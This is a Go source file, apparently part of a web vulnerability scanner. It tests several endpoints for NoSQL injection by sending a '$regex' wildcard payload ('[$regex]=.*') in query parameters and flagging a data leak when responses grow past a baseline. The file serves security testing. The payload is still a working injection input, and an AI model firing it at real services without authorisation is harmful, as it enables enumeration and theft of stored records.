package nosqliengine

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"net/url"
)

// ============================================================
//  REGEX DATA LEAK — Wildcard expansion response size diff
// ============================================================

// RunRegexLeak tests for data leakage using $regex wildcards and size comparison.
func RunRegexLeak(client *http.Client, baseURL string, target models.ScanTarget) *models.Vulnerability {
	endpoints := []string{"/api/users", "/search", "/products", "/api/find", "/directory"}
	params := []string{"user", "username", "email", "search", "name", "q"}

	for _, ep := range endpoints {
		for _, param := range params {
			targetURL := baseURL + ep

			// 1. Baseline - non-existent string
			baseReqURL := fmt.Sprintf("%s?%s=%s", targetURL, param, "dorm_nonexistent_999888777")
			baseResp, err := client.Get(baseReqURL)
			if err != nil {
				continue
			}
			baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 65536))
			_ = baseResp.Body.Close()
			baseLen := len(baseBody)

			// 2. Attack - regex wildcard to match all records
			attackReqURL := fmt.Sprintf("%s?%s[$regex]=%s", targetURL, param, url.QueryEscape(".*"))
			attackResp, err := client.Get(attackReqURL)
			if err != nil {
				continue
			}
			attackBody, _ := io.ReadAll(io.LimitReader(attackResp.Body, 65536))
			_ = attackResp.Body.Close()
			attackLen := len(attackBody)

			// If wildcard returns significantly more data than baseline, it's a leak
			if attackLen > (baseLen + 200) {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection ($regex Data Leak / Enumeration)",
					Severity: "HIGH",
					CVSS:     7.5,
					Description: fmt.Sprintf(
						"Data leakage detected via '$regex' wildcard.\n"+
							"Endpoint: %s\nParam: %s\n"+
							"Baseline Size: %d bytes\nWildcard Size: %d bytes",
						targetURL, param, baseLen, attackLen,
					),
					Solution:  "Enforce strict input types (String). Reject operator objects.",
					Reference: "CWE-943: Improper Neutralization in Data Query Logic",
				}
			}
		}
	}
	return nil
}
